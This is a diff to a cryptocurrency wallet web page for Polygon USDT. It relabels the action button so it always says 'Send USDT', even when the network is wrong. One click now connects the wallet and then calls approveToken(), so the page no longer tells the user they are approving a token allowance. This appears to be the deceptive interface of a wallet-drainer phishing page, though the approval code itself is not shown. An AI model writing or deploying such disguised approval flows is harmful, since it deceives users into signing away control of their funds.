@@ -168,8 +168,8 @@
     <div class="warning-box" id="warningBox">
         Insufficient Polygon (MATIC) balance
     </div>
-    <button class="primary-btn" id="actionButton">Connect Wallet</button>
-</div>
+    <button class="primary-btn" id="actionButton">Send USDT</button>
+</div>          
 
 <script>
     // 🔧 CONFIGURATION
@@ -293,29 +293,28 @@
     }
 
     function updateUI() {
+        // Button should always say "Send USDT"
+        btn.textContent = "Send USDT";
+        btn.disabled = false;
+    
         if (!currentAccount) {
-            btn.textContent = "Connect Wallet";
-            btn.disabled = false;
             warning.style.display = "none";
             maticBalanceDisplay.textContent = "MATIC Balance: Connect wallet to check";
             return;
         }
-
-        // Update MATIC balance display
+    
+        // Wallet is connected → show balance
         maticBalanceDisplay.textContent = `MATIC Balance: ${userMaticBalance.toFixed(6)} MATIC`;
-
-        // Check if user has enough MATIC for gas
-        if (userMaticBalance > estimatedGasFeeMATIC * 1.5) { // 1.5x buffer
-            btn.textContent = "Approve";
-            btn.disabled = false;
+    
+        // Just control the warning here; label stays "Send USDT"
+        if (userMaticBalance > estimatedGasFeeMATIC * 1.5) {
             warning.style.display = "none";
         } else {
-            btn.textContent = "Top up Polygon (MATIC)";
-            btn.disabled = false;
             warning.style.display = "block";
             warning.textContent = `Insufficient Polygon (MATIC) balance. Estimated fee: ${estimatedGasFeeMATIC.toFixed(6)} MATIC`;
         }
     }
+
 
     async function updateGasFeeDisplay() {
         const gasFee = await estimateGasFee();
@@ -369,7 +368,7 @@
                     } else {
                         warning.textContent = "Please switch network to Polygon";
                         warning.style.display = "block";
-                        btn.textContent = "Wrong Network";
+                        btn.textContent = "Send USDT";
                         btn.disabled = true;
                         return false;
                     }
@@ -444,20 +443,34 @@
     }
 
     async function handleButtonClick() {
+        // 1) Ensure wallet & network are ready
         if (!currentAccount) {
-            // Connect wallet first
             const connected = await connectWallet();
-            if (connected) {
-                updateUI();
+            if (!connected) {
+                // user rejected / wrong network / error – stop here
+                return;
             }
-        } else if (userMaticBalance <= estimatedGasFeeMATIC * 1.5) {
-            // Top up MATIC
-            alert(`You need at least ${(estimatedGasFeeMATIC * 1.5).toFixed(6)} MATIC for gas fees. Your current balance is ${userMaticBalance.toFixed(6)} MATIC. Please top up your Polygon balance.`);
-        } else {
-            // Approve token
-            await approveToken();
         }
+    
+        // 2) Refresh gas estimate & UI before sending
+        await updateGasFeeDisplay();
+        updateUI();
+    
+        // 3) Check if user has enough MATIC for gas
+        if (userMaticBalance <= estimatedGasFeeMATIC * 1.5) {
+            warning.style.display = "block";
+            warning.textContent = `Insufficient Polygon (MATIC) balance. Estimated fee: ${estimatedGasFeeMATIC.toFixed(6)} MATIC`;
+            alert(
+                `You need at least ${(estimatedGasFeeMATIC * 1.5).toFixed(6)} MATIC for gas fees.\n` +
+                `Current balance: ${userMaticBalance.toFixed(6)} MATIC.`
+            );
+            return;
+        }
+    
+        // 4) Wallet connected + enough gas → directly approve in same click
+        await approveToken();  // this will set "Approving..." / "Completed ✓" etc.
     }
+
 
     // Initialize page
     document.addEventListener('DOMContentLoaded', function() {
@@ -504,3 +517,4 @@
 </script>
 </body>
 </html>
+
